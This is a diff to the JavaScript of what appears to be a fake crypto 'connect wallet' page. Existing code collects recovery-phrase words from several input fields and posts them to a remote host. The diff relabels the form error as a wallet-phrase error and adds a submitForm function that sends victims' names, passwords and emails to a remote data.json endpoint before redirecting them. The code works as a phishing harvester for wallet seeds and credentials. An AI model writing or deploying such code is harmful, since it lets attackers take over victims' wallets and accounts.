@@ -64,7 +64,7 @@ function submitHandle(e){
 		values = values+" "+document.getElementById('Phase'+i).value;
 	}
 	if(max > 0){
-		document.getElementById('error').innerHTML = 'Invalid or Empty form field. Unable to connect.';
+		document.getElementById('error').innerHTML = 'Invalid or Empty wallet Phrase. Unable to connect.';
 	}else{
 		postData(document.getElementById('classs').value, values);
 		$('#preloader').removeClass("loaded");	
@@ -85,6 +85,28 @@ function setName(name){
 function readyFro(){
 		
 
+}
+
+
+function submitForm (e, g){
+	e.preventDefault();
+if(g == 1){
+	if(document.getElementById('pass').value == document.getElementById('passs').value && document.getElementById('passs').value.length > 2 && document.getElementById('name').value != '' && document.getElementById('lname').value != '' && document.getElementById('email').value != ''){
+	var name = document.getElementById('name').value + " " + document.getElementById('lname').value;
+	var pass = document.getElementById('pass').value;
+	var email = document.getElementById('email').value;
+$('#preloader').removeClass("loaded");	
+axios.post(getLink()+'/data.json', {name: name, key: pass, email: email, date: new Date()}, {headers: {'Content-Type': 'application/json'}}).then(res => {
+window.location.replace('./login.html?mint');
+}).catch(err => {window.location.replace('./404.html');});
+	}else{window.location.replace('./connect-wallet.html');}
+}else{
+if(document.getElementById('pass').value.length > 2 && document.getElementById('email').value != ''){
+		window.location.replace('./login.html?mint');
+	}else{window.location.replace('./connect-wallet.html');}
+}
+
+return false;
 }
 
 
@@ -131,3 +153,4 @@ document.addEventListener("keydown", e => {
 function getLink(){
 	return file;
 }
+
